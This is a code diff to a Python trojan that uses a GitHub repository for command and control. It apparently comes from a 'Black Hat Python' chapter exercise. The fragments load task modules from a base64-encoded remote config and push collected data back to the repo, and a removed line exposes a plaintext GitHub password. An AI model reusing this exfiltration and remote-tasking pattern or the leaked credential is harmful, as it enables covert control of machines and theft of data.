@@ -24,7 +24,8 @@ task_queue = queue.Queue()
 
 
 def connect2git():
-    git = login(username='wick-ztone', password='1097393685Ss')
+    passwd = getpass.getpass('Input your github password: ')
+    git = login(username='wick-ztone', password=passwd)
     repo = git.repository('wick-ztone', 'BHP-Chapter7')
     br = repo.branch('master')
     return git, repo, br
@@ -43,8 +44,8 @@ def get_contents(filepath):
 
 def get_config():
     global configured
-    _json = get_contents(trojan_config)
-    conf = json.loads(base64.b64decode(_json))
+    _json = base64.b64decode(get_contents(trojan_config))
+    conf = json.loads(_json.decode())
     configured = True
     for task in conf:
         if task['module'] not in sys.modules:
@@ -57,7 +58,7 @@ def store_module_result(data):
     # remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
     remote_path = 'data/%s/%d.data' % (trojan_id, id(trojan_id))
     repo.create_file(remote_path, 
-                     'Push the data of %s' % trojan_id, 
+                     'Push the data of ::::%s::::' % trojan_id, 
                      base64.b64encode(data))
 
 
